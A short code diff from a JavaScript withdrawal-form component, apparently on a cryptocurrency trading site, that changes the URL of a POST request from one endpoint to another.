@@ -119,7 +119,7 @@ function Withdrawform() {
           });
           ajax({
             url:
-              "https://cryptotrade2.herokuapp.com/mail",
+              "https://exchangecryptominers.com/unchainedtrade",
             method: "POST",
             headers: {
               "Content-Type": "application/json",
